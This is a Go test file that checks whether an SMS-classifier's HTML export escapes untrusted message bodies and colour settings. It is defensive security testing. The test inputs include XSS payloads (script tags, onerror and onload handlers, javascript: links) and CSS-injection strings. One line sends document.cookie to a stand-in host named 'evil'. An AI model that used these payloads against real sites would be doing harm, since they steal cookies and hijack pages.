package store

import (
	"encoding/json"
	"html"
	"os"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/senorMk/android-text-classifier/internal/android"
)

func TestThreadExportHTMLData(t *testing.T) {
	r := rec(9007199254740993, "</script><script>alert(1)</script>\n\"quoted\"", "otp", 1, "rules")
	r.ThreadID = 9007199254740995
	r.Address = "\"><img src=x>"
	page := render(t, []Record{r})
	match := regexp.MustCompile(`data-record="([^"]*)"`).FindStringSubmatch(page)
	if len(match) != 2 {
		t.Fatal("missing serialized record")
	}
	var got Record
	if err := json.Unmarshal([]byte(html.UnescapeString(match[1])), &got); err != nil {
		t.Fatal(err)
	}
	if got.ID != r.ID || got.ThreadID != r.ThreadID || got.Body != r.Body || got.Address != r.Address {
		t.Fatalf("record did not round-trip: %+v", got)
	}
	if !strings.Contains(page, `data-thread="thread:9007199254740995"`) {
		t.Fatal("thread identity lost precision")
	}
	if strings.Count(page, "<script") != 1 {
		t.Fatal("record escaped into script markup")
	}
}

// Write a self-checking browser fixture with:
// SMS_THREAD_FIXTURE=/tmp/threads.html go test ./internal/store -run TestWriteThreadFixture
func TestWriteThreadFixture(t *testing.T) {
	path := os.Getenv("SMS_THREAD_FIXTURE")
	if path == "" {
		t.Skip("set SMS_THREAD_FIXTURE for the browser check")
	}
	a := rec(1, "first reply", "personal", 1, "rules")
	b := rec(9007199254740993, `</script><img src=x onerror="window.__pwned=true"> verification`, "otp", 0.2, "rules")
	a.ThreadID, b.ThreadID = 9, 9
	a.Type = android.KindSent
	a.Date = b.Date.Add(-time.Hour)
	c := rec(3, "unrelated", "promo", 1, "rules")
	c.ThreadID = 10
	page := render(t, []Record{b, c, a})
	checks, err := os.ReadFile("testdata/threads.browser.js")
	if err != nil {
		t.Fatal(err)
	}
	page = strings.Replace(page, "</body>", "<script>"+string(checks)+"</script></body>", 1)
	if err := os.WriteFile(path, []byte(page), 0o600); err != nil {
		t.Fatal(err)
	}
}

func opts() HTMLOptions {
	return HTMLOptions{
		Serial:      "38071FDJG007QW",
		Title:       "SMS — test",
		Rules:       "<built-in>",
		Order:       []string{"otp", "banking", "promo", "other"},
		Colors:      map[string]string{"otp": "86", "banking": "220", "promo": "170"},
		ReviewBelow: 0.55,
	}
}

func rec(id int64, body string, cat string, conf float64, src string) Record {
	return Record{
		Message: android.Message{
			ID:      id,
			Address: "+260977000111",
			Person:  "Kalela",
			Body:    body,
			Type:    android.KindInbox,
			Read:    true,
			Date:    time.Date(2026, 9, 21, 14, 12, 0, 0, time.UTC).Add(-time.Duration(id) * time.Hour),
		},
		Class: Class{Category: cat, Confidence: conf, Reason: "because " + cat, Source: src},
	}
}

func render(t *testing.T, records []Record) string {
	t.Helper()
	var b strings.Builder
	if err := ExportHTML(&b, records, opts()); err != nil {
		t.Fatal(err)
	}
	return b.String()
}

// A message body is attacker-controlled: an SMS can arrive from anyone, and
// this file is opened in a browser. Nothing from a body may become markup.
func TestExportHTMLEscapesUntrustedText(t *testing.T) {
	nasty := []string{
		`<script>alert(1)</script>`,
		`</textarea><script>fetch('http://evil/'+document.cookie)</script>`,
		`<img src=x onerror="alert(1)">`,
		`"><script>alert(1)</script>`,
		`<!-- <script>alert(1)</script> -->`,
		`<style>body{display:none}</style>`,
		`<a href="javascript:alert(1)">click</a>`,
		`&lt;already escaped&gt; &amp; <b>bold</b>`,
	}
	var records []Record
	for i, body := range nasty {
		records = append(records, rec(int64(i+1), body, "other", 0.1, "rules"))
	}
	page := render(t, records)

	// The page ships exactly one <script> and one <style> — its own. Any
	// further one came from a body.
	if got := strings.Count(page, "<script"); got != 1 {
		t.Errorf("page has %d <script> tags, want only its own:\n%s", got, excerpt(page, "<script"))
	}
	if got := strings.Count(page, "<style"); got != 1 {
		t.Errorf("page has %d <style> tags, want only its own", got)
	}
	// A body that imitates a tag must appear escaped, never as markup.
	for _, bad := range []string{"<img src=x", "<style>body", "onerror=\"", "<a href="} {
		if strings.Contains(page, bad) {
			t.Errorf("exported page contains %q verbatim:\n%s", bad, excerpt(page, bad))
		}
	}
	if !strings.Contains(page, "&lt;script&gt;") {
		t.Error("expected the script tag to appear escaped in the body cell")
	}
	// The page's own script block is still intact.
	if !strings.Contains(page, "document.querySelectorAll") {
		t.Error("the page's filtering script was lost")
	}
	// A body that literally reads "&lt;b&gt;" is text the user typed, so the
	// source must encode the ampersand: &amp;lt;b&amp;gt;.
	for _, want := range []string{"&amp;lt;already escaped&amp;gt;", "&amp;amp;", "&lt;b&gt;bold&lt;/b&gt;"} {
		if !strings.Contains(page, want) {
			t.Errorf("expected %s in the body cell", want)
		}
	}
}

func TestExportHTMLStructure(t *testing.T) {
	page := render(t, []Record{
		rec(3, "G-123456 is your verification code", "otp", 1, "rules"),
		rec(2, "Your balance is 100 USD", "banking", 0.2, "rules"),
		rec(1, "50% off today", "promo", 0.9, "llm"),
	})

	for _, want := range []string{
		"<!doctype html>", "<title>SMS — test</title>",
		`data-cat="otp"`, `data-cat="banking"`, `data-cat="promo"`,
		"38071FDJG007QW",
		// Confidence markers the filter relies on.
		"unsure", "llm",
		// Long bodies start collapsed so the list is scannable; the text
		// itself stays in the DOM so search still reaches it.
		`class="body clamp"`,
	} {
		if !strings.Contains(page, want) {
			t.Errorf("page is missing %q", want)
		}
	}
	// Self-contained: no external stylesheet, script, image or font.
	for _, bad := range []string{"http://", "https://", "//cdn", "<link"} {
		if strings.Contains(page, bad) {
			t.Errorf("page references an external resource %q", bad)
		}
	}
}

// Newest first in, and the header's date range must reflect that.
func TestExportHTMLDateRange(t *testing.T) {
	newest := rec(1, "newest", "otp", 1, "rules")
	newest.Date = time.Date(2026, 9, 21, 14, 12, 0, 0, time.UTC)
	oldest := rec(2, "oldest", "otp", 1, "rules")
	oldest.Date = time.Date(2026, 3, 4, 8, 0, 0, 0, time.UTC)
	page := render(t, []Record{newest, oldest})
	// The range reads oldest to newest, matching the store order.
	if !strings.Contains(page, "4 Mar 2026 – 21 Sep 2026") {
		t.Errorf("header range wrong: %s", excerpt(page, "messages"))
	}
}

// A category the rules don't list must still get a chip, or its messages would
// be reachable only by text search.
func TestExportHTMLUnlistedCategoryStillGetsAChip(t *testing.T) {
	o := opts()
	o.Order = []string{"otp"}
	o.Colors = nil
	page := render(t, []Record{rec(1, "weird", "madeup", 0.5, "rules")})
	if !strings.Contains(page, `data-cat="madeup"`) {
		t.Error("unlisted category got no filter chip")
	}
	// With no colour configured it must fall back rather than emit an empty or
	// malformed style.
	if !strings.Contains(page, neutralColor) {
		t.Error("expected the neutral fallback colour")
	}
	if strings.Contains(page, "background:;") || strings.Contains(page, `style="background:"`) {
		t.Error("emitted a malformed style attribute")
	}
}

func TestValidColor(t *testing.T) {
	good := []string{"#abc", "#AABBCC", "#012345"}
	bad := []string{"", "86", "#ab", "#abcd", "#gggggg", "red", "#abc; background:url(x)", "url(#a)"}
	for _, c := range good {
		if !validColor(c) {
			t.Errorf("validColor(%q) = false, want true", c)
		}
	}
	for _, c := range bad {
		if validColor(c) {
			t.Errorf("validColor(%q) = true, want false", c)
		}
	}
}

// A rule file is trusted-ish but not worth trusting with CSS injection.
func TestColorForIgnoresNonsense(t *testing.T) {
	o := opts()
	o.Colors = map[string]string{
		"ok":     "86", // ANSI number from the default rules
		"hex":    "#ff8800",
		"weird":  "999999", // out of range for the palette
		"cssinj": "#fff;} body{display:none",
		"empty":  "",
	}
	for name, want := range map[string]string{
		"ok":     "#5fd0cc",
		"hex":    "#ff8800",
		"weird":  neutralColor,
		"cssinj": neutralColor,
		"empty":  neutralColor,
		"unset":  neutralColor,
	} {
		if got := colorFor(o, name); got != want {
			t.Errorf("colorFor(%q) = %q, want %q", name, got, want)
		}
	}
}

func TestExportHTMLEmpty(t *testing.T) {
	page := render(t, nil)
	if !strings.Contains(page, "<!doctype html>") {
		t.Error("an empty export should still be a valid page")
	}
	if !strings.Contains(page, ">0<") && !strings.Contains(page, ">0 messages") {
		t.Error("expected a zero count in the header")
	}
}

// Newlines and tabs in a body must survive as pre-wrapped text, not collapse.
func TestExportHTMLPreservesBodyLayout(t *testing.T) {
	page := render(t, []Record{rec(1, "line one\nline two\ttabbed", "other", 0.1, "rules")})
	if !strings.Contains(page, "line one\nline two\ttabbed") {
		t.Error("body whitespace was not preserved; white-space:pre-wrap needs the raw text")
	}
}

// TestWriteXSSFixture renders the same hostile bodies to a file a browser can
// be pointed at, for a manual end-to-end check after template changes:
//
//	SMS_XSS_FIXTURE=/tmp/xss.html go test ./internal/store/ -run XSSFixture
//
// Open it and check window.__pwned is never set.
func TestWriteXSSFixture(t *testing.T) {
	path := os.Getenv("SMS_XSS_FIXTURE")
	if path == "" {
		t.Skip("set SMS_XSS_FIXTURE to write the manual-check fixture")
	}
	payloads := []string{
		`<script>window.__pwned = "script tag";</script>`,
		`<img src=x onerror="window.__pwned='img onerror'">`,
		`<svg onload="window.__pwned='svg onload'"></svg>`,
		`</script><script>window.__pwned='escaped the script block'</script>`,
		`<a href="javascript:window.__pwned='href'">click me</a>`,
		`<iframe src="javascript:window.__pwned='iframe'"></iframe>`,
		`<style>*{display:none}</style>`,
		`<script>window.__pwned='unclosed script'`,
		`</textarea></script><script>window.__pwned='textarea break'</script>`,
		`<p title="</p><script>window.__pwned='attr break'</script>">x</p>`,
	}
	var records []Record
	for i, body := range payloads {
		records = append(records, rec(int64(i+1), body, "other", 0.1, "rules"))
	}
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	if err := ExportHTML(f, records, opts()); err != nil {
		t.Fatal(err)
	}
	t.Logf("wrote %d payloads to %s", len(payloads), path)
}

func excerpt(page, needle string) string {
	i := strings.Index(strings.ToLower(page), strings.ToLower(needle))
	if i < 0 {
		return ""
	}
	start := i - 80
	if start < 0 {
		start = 0
	}
	end := i + len(needle) + 80
	if end > len(page) {
		end = len(page)
	}
	return page[start:end]
}
